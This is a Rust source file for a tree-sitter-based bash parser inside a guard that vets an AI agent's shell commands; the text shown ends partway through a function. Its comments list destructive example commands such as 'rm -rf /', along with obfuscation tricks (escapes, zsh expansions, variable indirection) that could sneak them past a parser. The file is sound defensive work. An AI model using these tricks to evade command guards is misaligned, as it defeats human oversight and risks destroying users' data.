//! Tree-sitter-bash backed parser for the guard phase.
//!
//! Target: replace the per-rule shell-words boilerplate with a single
//! parse-once pipeline. The flow is:
//!
//! ```text
//! raw bash → tree-sitter AST → span classify → wrapper unwrap
//!            → flat Vec<EffectiveCommand> with argv/cwd/span/wrappers
//!            → predicate rules over EffectiveCommand
//!            → aggregate verdict
//! ```
//!
//! This module owns the first three steps. Rules in [`crate::rules`]
//! consume the resulting [`EffectiveCommand`] stream as pure predicates.

use std::cell::Cell;
use std::collections::HashMap;
use std::ops::Range;

use tree_sitter::{Node, Parser, Tree};

/// Where in the source a chunk of text actually executes vs. is data.
/// Heredoc bodies, single-quoted strings, and command-message arguments
/// (`git commit -m "..."`) are NOT executable; rules must not fire on
/// content found inside Data spans.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SpanKind {
    /// A top-level command (`CallExpression`) or a stage of a pipeline /
    /// subshell / command substitution. Rules apply.
    Executed,
    /// String literal, heredoc body, comment text. Rules do NOT apply.
    Data,
}

/// Tag describing the outermost wrapper a command was nested under.
/// Rules barely look at the specific wrapper kind — the discriminating
/// information (`remote`, `chrooted`) is already on `EffectiveCommand`
/// directly. The 25-variant enum we used to carry was a port from
/// bash-guard's taxonomy; six categories are enough to attribute the
/// chain in telemetry.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Wrapper {
    /// `sudo`, `doas` — privilege escalation, no semantic effect on
    /// classification beyond traceability.
    Sudo,
    /// `env`, `command`, `builtin`, `exec`, `timeout`, `nohup`, `time`,
    /// `nice`, `ionice`, `setsid`, `flock`, `busybox` — pass-through
    /// wrappers that don't change the inner command's meaning.
    PassThrough,
    /// `bash -c "..."`, `sh -c`, `zsh -c`, `ksh -c`, `dash -c`,
    /// `eval` — bodies are re-parsed as bash.
    Shell,
    /// `xargs <cmd>`, `parallel`, `watch` — inner command runs with
    /// argv extended by piped input (unknown at parse time).
    StdinArgs,
    /// `find ... -delete` (synthesized rm) and `find ... -exec cmd`.
    Find,
    /// `ssh host cmd` — inner command runs on a remote host. Marks
    /// `EffectiveCommand.remote = true`.
    Ssh,
    /// `chroot /path cmd` — marks `EffectiveCommand.chrooted = true`.
    Chroot,
}

/// One executable command after wrapper unwrapping. `argv[0]` is the
/// command name; `argv[1..]` are its arguments. `cwd` is propagated from
/// preceding `cd <abspath>` segments in the same compound command. The
/// `wrappers` chain records every wrapper this command sat inside, in
/// outer-to-inner order. `remote` and `chrooted` are short-cuts that
/// disable the local-safe-paths allowlist (an `rm -rf /tmp/foo` inside
/// `ssh remote` deletes a file on a different machine).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EffectiveCommand {
    pub argv: Vec<String>,
    pub cwd: Option<String>,
    pub span: SpanKind,
    pub wrappers: Vec<Wrapper>,
    pub remote: bool,
    pub chrooted: bool,
    /// One flag per `argv` word: true when the shell passes the word exactly
    /// as argv holds it (no expansion, globbing or splitting at run time).
    /// A missing flag means not literal.
    pub literal: Vec<bool>,
}

impl EffectiveCommand {
    /// Whether `argv[index]` is a word the shell leaves as written.
    pub fn is_literal(&self, index: usize) -> bool {
        self.literal.get(index).copied().unwrap_or(false)
    }

    pub fn head(&self) -> Option<&str> {
        self.argv.first().map(String::as_str)
    }

    pub fn args(&self) -> &[String] {
        if self.argv.is_empty() {
            &[]
        } else {
            &self.argv[1..]
        }
    }
}

/// Result of a parse: the flat list of effective commands the source
/// would execute, plus a `had_error` flag set when tree-sitter saw
/// ERROR/MISSING nodes (or failed to produce a tree at all). Callers
/// use the flag to drive the asymmetric fail-open decision in
/// [`crate::lib::check_detailed`].
#[derive(Debug)]
pub struct ParseResult {
    pub commands: Vec<EffectiveCommand>,
    pub had_error: bool,
    pub(crate) raw_allow_eligible: bool,
    /// How many of `commands` are extra decoded readings rather than what
    /// the walk itself produced. A caller deciding whether a re-parse
    /// "found nothing" must not count them.
    pub(crate) extra_readings: usize,
}

impl ParseResult {
    fn failed() -> Self {
        Self {
            commands: Vec::new(),
            had_error: true,
            raw_allow_eligible: false,
            extra_readings: 0,
        }
    }
}

/// Parse a raw bash command. Always returns a list of commands (possibly
/// empty) and a flag indicating whether the parse hit any error nodes.
pub fn parse(source: &str) -> ParseResult {
    parse_with_cwd(source, None)
}

pub(crate) fn parse_with_cwd(source: &str, cwd: Option<&str>) -> ParseResult {
    parse_reading(source, cwd)
}

fn parse_reading(source: &str, cwd: Option<&str>) -> ParseResult {
    let _outermost = OutermostParse::enter();
    let (mut result, cds, joined) = walk_source(source, cwd, false);
    // Readings the walk does not model are classified as extra commands, so
    // a verdict can only get stricter. A command the walk already holds is
    // classified the same way again, so only new ones are kept.
    for command in other_readings(source, cwd, &cds, joined.as_deref())
        .into_iter()
        .flat_map(|reading| reading.commands)
    {
        if !result.commands.contains(&command) {
            result.raw_allow_eligible = false;
            result.extra_readings += 1;
            result.commands.push(command);
        }
    }
    result
}

/// Stands in for a `cd` that failed: a word no program is named, which the
/// walk of a failed-`cd` reading drops.
const CD_FAILED: &str = "__secguard_cd_failed__";

/// More `cd` commands than this in one source get an indirect marker instead
/// of one failed-`cd` reading each.
const MAX_CD_READINGS: usize = 16;

/// Walks of other readings one outermost parse may spend. Readings multiply
/// through nested bodies (`bash -c` inside `bash -c`, each with its own
/// `cd` commands), so a crafted source could keep the guard walking for
/// minutes; past this, the source gets an indirect marker.
const MAX_READING_WALKS: usize = 256;

thread_local! {
    /// What is left of [`MAX_READING_WALKS`] for the outermost parse running
    /// on this thread; `None` between parses.
    static READING_WALKS: Cell<Option<usize>> = const { Cell::new(None) };
}

/// Opens the walk budget for the outermost parse and closes it when that
/// parse ends, also when it unwinds.
struct OutermostParse(bool);

impl OutermostParse {
    fn enter() -> Self {
        Self(READING_WALKS.with(|walks| {
            let outermost = walks.get().is_none();
            if outermost {
                walks.set(Some(MAX_READING_WALKS));
            }
            outermost
        }))
    }
}

impl Drop for OutermostParse {
    fn drop(&mut self) {
        if self.0 {
            READING_WALKS.with(|walks| walks.set(None));
        }
    }
}

/// Takes one walk from the budget; `false` once it is spent.
fn take_reading_walk() -> bool {
    READING_WALKS.with(|walks| match walks.get() {
        Some(left) if left > 0 => {
            walks.set(Some(left - 1));
            true
        }
        _ => false,
    })
}

/// A reading that only holds an indirect marker for `source`.
fn unresolved_reading(source: &str, cwd: Option<&str>) -> ParseResult {
    ParseResult {
        commands: vec![EffectiveCommand {
            argv: vec!["__indirect_unresolved__".to_string(), source.to_string()],
            cwd: cwd.map(str::to_owned),
            span: SpanKind::Executed,
            wrappers: Vec::new(),
            remote: false,
            chrooted: false,
            literal: Vec::new(),
        }],
        had_error: false,
        raw_allow_eligible: false,
        extra_readings: 0,
    }
}

/// The readings of `source` the walk itself does not model.
///
/// * A backslash-newline is dropped before the shell splits words, so
///   `r\<newline>m -rf /` runs `rm`, where tree-sitter splits the word in two.
///   The source is parsed once more with every backslash-newline removed,
///   also inside single quotes, where the shell keeps it.
/// * The walk assumes that every `cd` succeeds. After `cd /missing; touch f`
///   the shell is still where it was and writes `f` there. An absolute `cd`
///   replaces the whole directory, so a later command runs either where the
///   source started or in the target of the last `cd` that succeeded: the
///   reading in which every `cd` fails and the readings in which exactly one
///   succeeds cover every such directory.
fn other_readings(
    source: &str,
    cwd: Option<&str>,
    cds: &[Range<usize>],
    joined: Option<&str>,
) -> Vec<ParseResult> {
    let mut readings = Vec::new();
    if let Some(joined) = joined {
        if !take_reading_walk() {
            readings.push(unresolved_reading(source, cwd));
            return readings;
        }
        readings.push(parse_reading(joined, cwd));
    }
    // tree-sitter pulls a line that starts with an escaped program name
    // (`\export ...`) into the command before it; without the backslash it
    // is read as the command the shell runs.
    if let Some(unescaped) = unescape_line_starts(source) {
        if !take_reading_walk() {
            readings.push(unresolved_reading(source, cwd));
            return readings;
        }
        readings.push(parse_reading(&unescaped, cwd));
    }
    if cds.len() > MAX_CD_READINGS {
        readings.push(unresolved_reading(source, cwd));
        return readings;
    }
    let all: Vec<usize> = (0..cds.len()).collect();
    let mut failing_sets = Vec::new();
    if !cds.is_empty() {
        failing_sets.push(all.clone());
    }
    if cds.len() > 1 {
        for succeeds in 0..cds.len() {
            failing_sets.push(all.iter().copied().filter(|&i| i != succeeds).collect());
        }
    }
    for failing in failing_sets {
        if !take_reading_walk() {
            readings.push(unresolved_reading(source, cwd));
            break;
        }
        let ranges: Vec<&Range<usize>> = failing.iter().map(|&i| &cds[i]).collect();
        let text = replace_ranges(source, &ranges, CD_FAILED);
        readings.push(walk_source(&text, cwd, true).0);
    }
    readings
}

/// `source` with each range replaced by `with`. A range inside another one
/// that is replaced goes with it.
fn replace_ranges(source: &str, ranges: &[&Range<usize>], with: &str) -> String {
    let mut outer: Vec<&Range<usize>> = ranges
        .iter()
        .copied()
        .filter(|range| {
            !ranges
                .iter()
                .any(|other| other != range && other.start <= range.start && range.end <= other.end)
        })
        .collect();
    outer.sort_by_key(|range| std::cmp::Reverse(range.start));
    let mut text = source.to_string();
    for range in outer {
        text.replace_range(range.clone(), with);
    }
    text
}

/// Merge the words a glued child added at `from` into the word before.
fn merge_glued(words: &mut Vec<String>, literal: &mut Vec<bool>, from: usize) {
    if from == 0 || words.len() <= from {
        return;
    }
    let tail: String = words.drain(from..).collect();
    words[from - 1].push_str(&tail);
    literal.truncate(from);
    literal[from - 1] = false;
}

/// The source with the backslash removed from every line that starts, after
/// blanks, with a backslash and then a character that is not a newline; `None`
/// when there is no such line.
fn unescape_line_starts(source: &str) -> Option<String> {
    let mut out = String::with_capacity(source.len());
    let mut changed = false;
    for (index, line) in source.split('\n').enumerate() {
        if index > 0 {
            out.push('\n');
            let blanks = line.len() - line.trim_start_matches([' ', '\t']).len();
            let rest = &line[blanks..];
            if rest.starts_with('\\') && rest.len() > 1 {
                out.push_str(&line[..blanks]);
                out.push_str(&rest[1..]);
                changed = true;
                continue;
            }
        }
        out.push_str(line);
    }
    changed.then_some(out)
}

/// A comment that does not start a word: the byte before `#` is not a blank
/// or operator, or is a blank escaped by a backslash (`\ #`).
fn misread_comment(root: Node<'_>, bytes: &[u8]) -> bool {
    let mut cursor = root.walk();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        if node.kind() == "comment" {
            let start = node.start_byte();
            if start > 0 {
                let before = bytes[start - 1];
                let starts_word = matches!(before, b'\n' | b';' | b'&' | b'|' | b'(' | b')')
                    || matches!(before, b' ' | b'\t' | b'\r' | 0x0b | 0x0c) && {
                        let backslashes = bytes[..start - 1]
                            .iter()
                            .rev()
                            .take_while(|&&byte| byte == b'\\')
                            .count();
                        backslashes % 2 == 0
                    };
                if !starts_word {
                    return true;
                }
            }
        }
        stack.extend(node.children(&mut cursor));
    }
    false
}

/// A command name the shell reads as `cd`: `cd`, `\cd`, `c\d`, `'cd'`.
fn names_cd(name: Node<'_>, bytes: &[u8]) -> bool {
    let text = name.utf8_text(bytes).unwrap_or("");
    decode_token(text) == "cd"
        || name
            .named_child(0)
            .and_then(|word| literal_word(word, bytes))
            .is_some_and(|word| word == "cd")
}

/// The source with the backslash-newlines the shell removes taken out. The
/// shell keeps them inside a comment (the newline ends it), a single-quoted
/// or ANSI-C string and the body of a heredoc with a quoted delimiter; an
/// escaped backslash before a newline is not a continuation.
fn join_continuations(source: &str, root: Node<'_>) -> String {
    let bytes = source.as_bytes();
    let mut kept: Vec<Range<usize>> = Vec::new();
    let mut cursor = root.walk();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        match node.kind() {
            "comment" | "raw_string" | "ansi_c_string" => kept.push(node.byte_range()),
            "heredoc_redirect" => {
                let mut inner = node.walk();
                let children: Vec<Node<'_>> = node.children(&mut inner).collect();
                let quoted = children.iter().any(|child| {
                    child.kind() == "heredoc_start"
                        && child
                            .utf8_text(bytes)
                            .is_ok_and(|start| start.contains(['\'', '"', '\\']))
                });
                if quoted {
                    kept.extend(
                        children
                            .iter()
                            .filter(|child| child.kind() == "heredoc_body")
                            .map(|body| body.byte_range()),
                    );
                }
            }
            _ => {}
        }
        stack.extend(node.children(&mut cursor));
    }
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\\' && !kept.iter().any(|range| range.contains(&i)) {
            match bytes.get(i + 1) {
                Some(b'\n') => {
                    i += 2;
                    continue;
                }
                Some(&escaped) => {
                    out.push(b'\\');
                    out.push(escaped);
                    i += 2;
                    continue;
                }
                None => {}
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    // Only ASCII pairs were removed, so the text stays UTF-8.
    String::from_utf8(out).unwrap_or_else(|_| source.replace("\\\n", ""))
}

/// The byte ranges of every `cd` command in the tree.
fn cd_commands(node: Node<'_>, bytes: &[u8]) -> Vec<Range<usize>> {
    let mut found = Vec::new();
    let mut cursor = node.walk();
    let mut stack = vec![node];
    while let Some(node) = stack.pop() {
        if node.kind() == "command"
            && node
                .child_by_field_name("name")
                .is_some_and(|name| names_cd(name, bytes))
        {
            found.push(node.byte_range());
        }
        stack.extend(node.children(&mut cursor));
    }
    found
}

/// Walk one reading of `source`; also returns the `cd` commands in it.
fn walk_source(
    source: &str,
    cwd: Option<&str>,
    cd_fails: bool,
) -> (ParseResult, Vec<Range<usize>>, Option<String>) {
    let (mut result, cds, joined, misread) = walk_tree(source, cwd, cd_fails);
    // A `#` the shell reads as text (`echo \ #; cmd`) but tree-sitter takes
    // for a comment hides what follows it.
    if misread {
        result.raw_allow_eligible = false;
        result.extra_readings += 1;
        result
            .commands
            .extend(unresolved_reading(source, cwd).commands);
    }
    (result, cds, joined)
}

/// [`walk_source`] without the misread-comment marker.
fn walk_tree(
    source: &str,
    cwd: Option<&str>,
    cd_fails: bool,
) -> (ParseResult, Vec<Range<usize>>, Option<String>, bool) {
    let mut parser = Parser::new();
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return (ParseResult::failed(), Vec::new(), None, false);
    }
    let Some(tree) = parser.parse(source, None) else {
        return (ParseResult::failed(), Vec::new(), None, false);
    };

    let bytes = source.as_bytes();
    let mut walker = Walker::new(bytes);
    walker.cwd = cwd.map(str::to_owned);
    walker.cd_fails = cd_fails;
    walker.walk_program(tree.root_node());

    let root = tree.root_node();
    let raw_allow_eligible = root.named_child_count() == 1
        && root
            .named_child(0)
            .is_some_and(|node| simple_literal_command(node, bytes))
        && walker.commands.len() == 1
        && walker.commands[0].wrappers.is_empty();

    let cds = cd_commands(root, bytes);
    let joined = source
        .contains("\\\n")
        .then(|| join_continuations(source, root))
        .filter(|joined| joined != source);
    let result = ParseResult {
        raw_allow_eligible,
        extra_readings: walker.extra_readings,
        commands: walker.commands,
        had_error: tree_has_error(&tree),
    };
    let misread = misread_comment(root, bytes);
    (result, cds, joined, misread)
}

/// A raw allow vouches for exactly one unwrapped, literal shell invocation.
fn simple_literal_command(node: Node<'_>, bytes: &[u8]) -> bool {
    if node.kind() != "command" {
        return false;
    }
    let mut cursor = node.walk();
    let simple = node
        .named_children(&mut cursor)
        .all(|child| match child.kind() {
            "command_name" => child.named_child(0).is_some_and(|n| literal_node(n, bytes)),
            _ => literal_node(child, bytes),
        });
    simple
}

/// A decoded reading is not re-parsed as a shell body or tracked as a cd,
/// and a decoded program name is not unwrapped like argv's. It cannot stand
/// for the command when what it decodes is a wrapper the walker would
/// unwrap (`'sudo' rm`, `"bash" -c`, `'eval'`, `'find' -delete`), a
/// directory change (`"cd"`, or `cd /x/'policy dir'` whose target needed
/// decoding) or a script the shell sources.
fn dispatches(argv: &[String], reading: &[String]) -> bool {
    let decoded_head = argv.first() != reading.first();
    let head = reading.first().map_or("", |head| basename(head));
    let directory_or_source = matches!(head, "cd" | "pushd" | "popd" | "source" | ".");
    // A quoted shell may read its script from stdin (`'bash' <<< ...`,
    // `| 'bash'`), which unwrap_wrapper only models for `-c`.
    let shell = matches!(head, "bash" | "sh" | "zsh" | "ksh" | "dash" | "fish");
    directory_or_source || decoded_head && (shell || unwrap_wrapper(reading).is_some())
}

/// A glob, or a brace that is not a `${...}` parameter expansion (which
/// argv's own indirect path handles).
fn expands_to_a_program(name: &str) -> bool {
    let bytes = name.as_bytes();
    name.contains(['*', '?', '['])
        || bytes
            .iter()
            .enumerate()
            .any(|(i, &b)| b == b'{' && (i == 0 || bytes[i - 1] != b'$'))
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// How one command child reads once its quoted parts are decoded.
enum Reading {
    /// argv already holds what the program receives.
    Same,
    /// The program receives this word instead.
    Decoded(String),
    /// The program receives something this parser cannot decode.
    Opaque,
}

/// Only the shapes argv gets wrong: a program name that holds quotes, a
/// word glued from quoted parts (argv keeps the quote marks), an ANSI-C
/// string (dropped when standalone, kept raw when glued), and nodes argv
/// drops outright. Only direct children are inspected: a command
/// substitution inside a word is walked as its own command.
fn decoded_reading(node: Node<'_>, bytes: &[u8]) -> Reading {
    fn quoted_part(part: Node<'_>) -> bool {
        matches!(
            part.kind(),
            "string" | "raw_string" | "ansi_c_string" | "translated_string"
        )
    }
    /// A part whose text the program receives cannot be decoded here: an
    /// ANSI-C escape this does not model, `$"..."` or brace expansion.
    fn undecodable(node: Node<'_>, bytes: &[u8]) -> bool {
        let opaque = |part: Node<'_>| match part.kind() {
            "ansi_c_string" => {
                literal_word(part, bytes).is_none() || !ansi_c_ends_at_node(part, bytes)
            }
            // A glued `$"rd"` parses as an anonymous `$` and a string.
            "translated_string" | "brace_expression" | "$" => true,
            _ => false,
        };
        let mut cursor = node.walk();
        opaque(node) || node.children(&mut cursor).any(opaque)
    }
    /// Decoded when every part is literal. A part that expands at run time
    /// (`"$HOME/bin/x"`, `$'a'"$USER"`) leaves argv as it was, `$` visible
    /// to its indirect path; only an undecodable part is opaque.
    fn decode(node: Node<'_>, bytes: &[u8]) -> Reading {
        match literal_word(node, bytes) {
            Some(word) => Reading::Decoded(word),
            None if undecodable(node, bytes) => Reading::Opaque,
            None => Reading::Same,
        }
    }
    let glued_quotes = |node: Node<'_>| {
        let mut cursor = node.walk();
        let quoted = node.children(&mut cursor).any(quoted_part);
        quoted
    };
    match node.kind() {
        // `r{m,}`, `/bin/r?`: brace or glob expansion picks the program at
        // run time; tree-sitter often keeps such a name as a plain word.
        "command_name" if node.utf8_text(bytes).is_ok_and(expands_to_a_program) => Reading::Opaque,
        "command_name" => match node.named_child(0) {
            Some(name) if matches!(name.kind(), "string" | "raw_string") => decode(name, bytes),
            // `$"rm"`, `r{m,}`: the program run is not decoded here.
            Some(name) if matches!(name.kind(), "translated_string" | "brace_expression") => {
                Reading::Opaque
            }
            Some(name) if name.kind() == "concatenation" && glued_quotes(name) => {
                decode(name, bytes)
            }
            // argv decodes a whole `$'rm'` only when it has no escapes.
            Some(name) if name.kind() == "ansi_c_string" => match literal_word(name, bytes) {
                Some(word) if name.utf8_text(bytes).is_ok_and(|t| decode_token(t) == word) => {
                    Reading::Same
                }
                Some(word) => Reading::Decoded(word),
                None => Reading::Opaque,
            },
            _ => Reading::Same,
        },
        "ansi_c_string" => decode(node, bytes),
        // `--output='policy dir/x'`, `'policy dir'/x`: argv keeps the quote
        // marks, so the decoded word is read once more.
        "concatenation" if glued_quotes(node) => decode(node, bytes),
        "translated_string" | "brace_expression" => Reading::Opaque,
        _ => Reading::Same,
    }
}

/// zsh expands a word `=rm` to the path of `rm` (option EQUALS, on by
/// default), so `=rm -rf /` and `sudo =rm -rf /` run rm. Bash runs a program
/// named `=rm`, which does not exist.
fn zsh_equals(child: Node<'_>, bytes: &[u8]) -> Option<String> {
    let word = match child.kind() {
        "word" => child,
        "command_name" => child.named_child(0).filter(|name| name.kind() == "word")?,
        _ => return None,
    };
    let name = word.utf8_text(bytes).ok()?.strip_prefix('=')?;
    let program = name.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_')
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '+'));
    program.then(|| name.to_string())
}

/// Whether bash ends this `$'...'` where tree-sitter does: `\` escapes the
/// next character, the first other `'` closes it. tree-sitter reads
/// `$'\\';rm x;'` as one string, where bash closes it after `\\`.
fn ansi_c_ends_at_node(node: Node<'_>, bytes: &[u8]) -> bool {
    let text = node.utf8_text(bytes).unwrap_or("");
    let Some(inner) = text.strip_prefix("$'") else {
        return false;
    };
    let mut chars = inner.char_indices();
    while let Some((index, c)) = chars.next() {
        match c {
            '\\' => {
                chars.next();
            }
            '\'' => return index + 1 == inner.len(),
            _ => {}
        }
    }
    false
}

/// The word a run of literal parts passes to the program, or `None` when any
/// part expands at run time or is a shape this does not model.
fn literal_word(node: Node<'_>, bytes: &[u8]) -> Option<String> {
    let text = node.utf8_text(bytes).ok()?;
    match node.kind() {
        "concatenation" => {
            let mut cursor = node.walk();
            let mut word = String::new();
            for child in node.children(&mut cursor) {
                word.push_str(&literal_word(child, bytes)?);
            }
            Some(word)
        }
        "word" | "number" if literal_node(node, bytes) => Some(decode_token(text)),
        "raw_string" => text
            .strip_prefix('\'')
            .and_then(|t| t.strip_suffix('\''))
            .map(str::to_string),
        "string" if literal_node(node, bytes) => shell_words::split(text)
            .ok()
            .filter(|words| words.len() == 1)
            .and_then(|mut words| words.pop()),
        "ansi_c_string" if ansi_c_ends_at_node(node, bytes) => text
            .strip_prefix("$'")
            .and_then(|t| t.strip_suffix('\''))
            .and_then(decode_ansi_c),
        _ => None,
    }
}

/// The text bash makes of the inside of `$'...'`, or `None` for an escape
/// this does not model or a byte outside ASCII (bash emits raw bytes there).
/// A NUL makes the word opaque: bash and zsh read it differently.
fn decode_ansi_c(inner: &str) -> Option<String> {
    /// Up to `max` digits of `radix` from the front of `chars`, as text.
    fn digits(
        chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
        radix: u32,
        max: usize,
    ) -> String {
        let mut taken = String::new();
        while taken.len() < max {
            match chars.peek() {
                Some(c) if c.is_digit(radix) => taken.push(*c),
                _ => break,
            }
            chars.next();
        }
        taken
    }
    let mut out = String::new();
    let mut chars = inner.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        let value = match chars.next()? {
            'a' => 0x07,
            'b' => 0x08,
            'e' | 'E' => 0x1b,
            'f' => 0x0c,
            'n' => 0x0a,
            'r' => 0x0d,
            't' => 0x09,
            'v' => 0x0b,
            '\\' => 0x5c,
            '\'' => 0x27,
            '"' => 0x22,
            '?' => 0x3f,
            first @ '0'..='7' => {
                let mut octal = String::from(first);
                octal.push_str(&digits(&mut chars, 8, 2));
                u32::from_str_radix(&octal, 8).ok()?
            }
            'x' => u32::from_str_radix(&digits(&mut chars, 16, 2), 16).ok()?,
            // bash reads `\cX` as a control byte, zsh as the text `cX`
            // (`$'\chmod'` runs chmod under zsh): no single reading.
            'c' => return None,
            _ => return None,
        };
        if value == 0 {
            // bash keeps the text after a NUL out of the word, zsh cuts the
            // word there (`$'rm\x00'x` runs `rm` under zsh): no single
            // reading is right, so the part is opaque.
            return None;
        }
        if value > 0x7f {
            return None;
        }
        out.push(char::from_u32(value)?);
    }
    Some(out)
}

/// Whether argv holds exactly what the shell passes for this command child.
///
/// A single-quoted string, a double-quoted string with nothing to expand and
/// no backslash (argv does not decode its escapes), a number, and an unquoted
/// word made only of characters no shell expands. A word starting with `=`
/// is a zsh path expansion. Anything else, including a glued quote whose
/// argv keeps the quote marks, is not literal.
fn literal_value(node: Node<'_>, bytes: &[u8]) -> bool {
    let text = node.utf8_text(bytes).unwrap_or("");
    match node.kind() {
        "raw_string" | "number" => true,
        "word" => plain_word(text),
        // zsh expands `$~X`, `$^X` and `$=X` inside double quotes, which
        // tree-sitter keeps as string content; argv does not decode a
        // backslash in double quotes.
        "string" => literal_node(node, bytes) && !text.contains(['\\', '$', '`']),
        // argv keeps the quote marks of a quoted program name (`'export'`).
        "command_name" => node.named_child(0).is_some_and(|name| {
            name.kind() == "word" && plain_word(name.utf8_text(bytes).unwrap_or(""))
        }),
        "concatenation" => {
            let mut cursor = node.walk();
            let words = node.children(&mut cursor).all(|part| part.kind() == "word");
            words && plain_word(text)
        }
        _ => false,
    }
}

/// An unquoted word no shell expands: characters outside every expansion,
/// glob and zsh path syntax, or any character behind a backslash (argv
/// decodes the escape). A leading unescaped `=` is a zsh path expansion.
fn plain_word(text: &str) -> bool {
    let mut chars = text.chars();
    let mut any = false;
    while let Some(c) = chars.next() {
        any = true;
        match c {
            '\\' => {
                if chars.next().is_none_or(|escaped| escaped == '\n') {
                    return false;
                }
            }
            c if c.is_alphanumeric() => {}
            '_' | '.' | '/' | ':' | '@' | '%' | '+' | ',' | '-' => {}
            '=' if any && !text.starts_with('=') => {}
            _ => return false,
        }
    }
    any
}

/// Whether a word that literal_word decoded is fixed at run time: every part
/// is a single-quoted string, a double-quoted string literal_value accepts,
/// a plain word or a decodable ANSI-C string.
fn decoded_literal(node: Node<'_>, bytes: &[u8]) -> bool {
    match node.kind() {
        "concatenation" => {
            let mut cursor = node.walk();
            let parts: Vec<Node<'_>> = node.children(&mut cursor).collect();
            parts.iter().all(|part| decoded_literal(*part, bytes))
        }
        "command_name" => node
            .named_child(0)
            .is_some_and(|name| decoded_literal(name, bytes)),
        "ansi_c_string" => literal_word(node, bytes).is_some(),
        _ => literal_value(node, bytes),
    }
}

fn literal_node(node: Node<'_>, bytes: &[u8]) -> bool {
    match node.kind() {
        "raw_string" | "number" => true,
        "word" => !node
            .utf8_text(bytes)
            .unwrap_or("")
            .contains(['*', '?', '[', '{', '$', '`', '~']),
        "string" => {
            let mut cursor = node.walk();
            let static_text = node
                .named_children(&mut cursor)
                .all(|n| n.kind() == "string_content");
            static_text
        }
        _ => false,
    }
}

fn tree_has_error(tree: &Tree) -> bool {
    fn walk(node: Node<'_>) -> bool {
        if node.is_error() || node.is_missing() {
            return true;
        }
        let mut cursor = node.walk();
        let children: Vec<Node<'_>> = node.children(&mut cursor).collect();
        children.into_iter().any(walk)
    }
    walk(tree.root_node())
}

struct Walker<'a> {
    src: &'a [u8],
    commands: Vec<EffectiveCommand>,
    /// Lexical cwd accumulated as we walk a compound (`cd /tmp && rm -rf
    /// x` → cwd=/tmp when we get to rm). Reset on subshell boundary
    /// because `(cd /tmp); rm` does NOT inherit /tmp on the second leg.
    cwd: Option<String>,
    /// Lexical variable bindings captured from top-level assignments
    /// (`a="rm -rf /"`). Used to resolve `$a` indirection in command
    /// position and inside `bash -c "$a"` bodies. Without this the AST
    /// flow leaves `$a` opaque and rules silently allow the destruction.
    /// Subshell save/restore mirrors `cwd` because `(a=...)` does not
    /// leak the binding outside.
    bindings: HashMap<String, String>,
    /// Extra decoded readings pushed into `commands`, including those taken
    /// over from nested re-parses (see [`ParseResult::extra_readings`]).
    extra_readings: usize,
    /// This walk is a reading in which some `cd` commands failed: they were
    /// replaced by [`CD_FAILED`], which runs nothing, and `&&` after one
    /// skips its right side (see [`other_readings`]).
    cd_fails: bool,
}

/// Names we trust to resolve from process env at parse time.
///
/// Per decision.guard-indirection-hardening, `bounded_envvar_trust`:
/// keeping this set small and known-interactive is the price for not
/// flagging every legit `$EDITOR file` / `${HOME}/cache`. Shell-set
/// values for these names override via the same lexical-bindings path
/// any other variable uses — so an agent doing `HOME=/; rm -rf $HOME`
/// rebinds `HOME` in the lexical scope, NOT in this allowlist. The
/// allowlist is only consulted when the lexical binding is absent.
const TRUSTED_ENV_NAMES: &[&str] = &[
    "HOME", "PWD", "EDITOR", "PAGER", "VISUAL", "BROWSER", "SHELL",
];

impl<'a> Walker<'a> {
    fn new(src: &'a [u8]) -> Self {
        Self {
            src,
            commands: Vec::new(),
            cwd: None,
            bindings: HashMap::new(),
            extra_readings: 0,
            cd_fails: false,
        }
    }

    /// Resolve a variable name. Lexical bindings win over process env.
    /// Process env only consulted for names in `TRUSTED_ENV_NAMES` —
    /// otherwise the agent could rely on whatever junk happens to be
    /// in env at guard-time (e.g. `LD_PRELOAD`, `PATH`, custom names).
    /// `__TAINTED_OPAQUE__` is the sentinel for refused-but-shadowed
    /// trusted-env names; treating it as an unresolvable miss prevents
    /// the env-fallback bypass.
    fn lookup(&self, name: &str) -> Option<String> {
        if let Some(v) = self.bindings.get(name) {
            if v == "__TAINTED_OPAQUE__" {
                return None;
            }
            return Some(v.clone());
        }
        if TRUSTED_ENV_NAMES.contains(&name) {
            if let Ok(v) = std::env::var(name) {
                return Some(v);
            }
        }
        None
    }

    fn text(&self, node: Node<'_>) -> &'a str {
        node.utf8_text(self.src).unwrap_or("")
    }

    /// Classify `reading`, another way the shell may read `argv`, as extra
    /// commands; returns whether what it runs stays unknown.
    ///
    /// The reading is classified as a flat command and, like argv below,
    /// peeled of the wrappers around it, so `sudo rm $'-rf' $'/'` is read as
    /// `rm -rf /` inside sudo. It is not re-parsed as a shell body or tracked
    /// as a cd: a decoded program that is one of those (`'sudo' rm`,
    /// `"bash" -c`, `'eval'`, `"cd"`), a body to re-parse (`sudo bash -c
    /// $'rm -rf /'`) or a shell reading its script from stdin is opaque.
    fn push_reading(
        &mut self,
        argv: &[String],
        reading: &[String],
        literal: &[bool],
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) -> bool {
        if reading == argv || reading.is_empty() {
            return false;
        }
        let mut opaque = dispatches(argv, reading);
        let mut peeled = reading.to_vec();
        let mut peeled_literal = literal.to_vec();
        let mut chain = wrappers.to_vec();
        let (mut peeled_remote, mut peeled_chrooted) = (remote, chrooted);
        while let Some((wrapper, inner, r, c, body)) = unwrap_wrapper(&peeled) {
            if body.is_some() {
                opaque = true;
            }
            if body.is_some() || inner.is_empty() {
                break;
            }
            chain.push(wrapper);
            peeled_remote |= r;
            peeled_chrooted |= c;
            // xargs -I, watch, ssh and sudo -s hand the words to something
